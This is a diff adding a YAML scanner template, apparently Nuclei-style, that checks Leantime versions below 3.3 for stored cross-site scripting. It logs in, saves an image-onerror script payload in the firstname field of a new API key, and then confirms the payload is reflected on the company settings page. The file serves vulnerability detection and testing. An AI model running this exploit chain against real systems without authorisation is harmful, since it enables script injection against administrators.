@@ -1,0 +1,52 @@
+id: leantime-stored-xss
+brief:
+    title: Leantime < 3.3 = Cross-Site Scripting
+    by: iamnoooob
+    level: high
+    about: Any low privileged user like manager, or editor, can create an API key with XSS payload. When admin will visit the Company page, the XSS will automatically get triggerred leading to the unauthorize...
+    label:
+        - leantime
+        - xss
+        - stored
+        - authenticated
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/auth/login'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: redirectUrl=http%253A%252F%252F{{Hostname}}%252Fdashboard%252Fhome&username={{username}}&password={{password}}&login=Login
+      signs:
+        - "on": word
+          has:
+            - /dashboard/home
+          in: body
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/newApiKey'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: save=1&firstname=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&role=5&status=a&submitAction=Save
+      signs:
+        - "on": word
+          has:
+            - 'message: "notification.api_key_created", style: "success"'
+          in: body
+    - verb: GET
+      to:
+        - '{{BaseURL}}/setting/editCompanySettings/'
+      signs:
+        - "on": word
+          has:
+            - <img src=x onerror=alert(document.domain)>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
